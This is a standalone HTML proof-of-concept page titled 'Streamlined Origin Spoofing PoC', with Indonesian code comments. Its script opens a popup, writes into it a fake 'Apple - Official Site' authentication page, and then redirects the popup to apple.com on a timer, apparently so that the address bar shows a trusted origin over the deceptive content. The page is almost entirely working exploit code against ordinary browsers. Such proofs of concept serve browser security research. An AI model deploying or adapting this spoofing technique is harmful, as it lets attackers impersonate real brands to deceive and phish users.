<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
    <title>Streamlined Origin Spoofing PoC</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #0b0e14;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: #f0f6fc;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .container { text-align: center; max-width: 600px; padding: 20px; }
      button {
        padding: 18px 36px;
        font-size: 16px;
        font-weight: 600;
        background: #da3633;
        color: #fff;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
        transition: transform 0.1s, background 0.2s;
      }
      button:active { background: #b62324; transform: scale(0.98); }
      .info {
        margin-top: 20px;
        font-size: 13px;
        color: #8b949e;
        font-family: monospace;
        word-break: break-all;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <button id="execBtn">INITIALIZE STREAMLINED EXPLOIT</button>
      <div class="info" id="statusInfo">Status: Ready for execution.</div>
    </div>

    <script>
      // Menggunakan let sesuai preferensi perbaikan deklarasi variabel
      let execButton = document.getElementById("execBtn");
      let statusInfo = document.getElementById("statusInfo");

      execButton.onclick = function () {
        statusInfo.innerText = "Status: Initializing execution flow...";
        this.style.display = "none";

        // Membuka jendela baru dengan referensi let (menghindari const)
        let targetWindow = window.open("about:blank", "_blank");

        if (!targetWindow) {
          statusInfo.innerText = "Status: Execution halted - Popup blocked by browser policy.";
          return;
        }

        try {
          statusInfo.innerText = "Status: Writing initial deceptive DOM structure...";

          let htmlPayload = `
            <!DOCTYPE html>
            <html>
            <head>
              <title>Apple - Official Site</title>
              <style>
                body {
                  margin: 0; background: #ffffff; color: #1d1d1f;
                  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                  display: flex; align-items: center; justify-content: center;
                  height: 100vh; text-align: center;
                }
                .box { padding: 40px; }
                h1 { font-size: 38px; color: #d70015; margin-bottom: 10px; font-weight: 700; }
                p { font-size: 20px; color: #0066cc; font-weight: 500; }
              </style>
            </head>
            <body>
              <div class="box">
                <h1>AUTHENTICATION VERIFICATION</h1>
                <p>Establishing secure connection state...</p>
              </div>
            </body>
            </html>
          `;

          // Eksekusi penulisan dokumen secara sinkron ke jendela target
          targetWindow.document.open();
          targetWindow.document.write(htmlPayload);
          targetWindow.document.close();

          statusInfo.innerText = "Status: DOM committed. Synchronizing timing sequence...";

          // Logika timing terstruktur untuk menguji stabilitas transisi state
          setTimeout(() => {
            try {
              statusInfo.innerText = "Status: Dispatching final target navigation...";
              targetWindow.location.href = "https://apple.com";
            } catch (navError) {
              statusInfo.innerText = "Status: Navigation restricted by security policy: " + navError.message;
            }
          }, 800);

        } catch (err) {
          statusInfo.innerText = "Status: Injection error encountered: " + err.message;
        }
      };
    </script>
  </body>
</html>
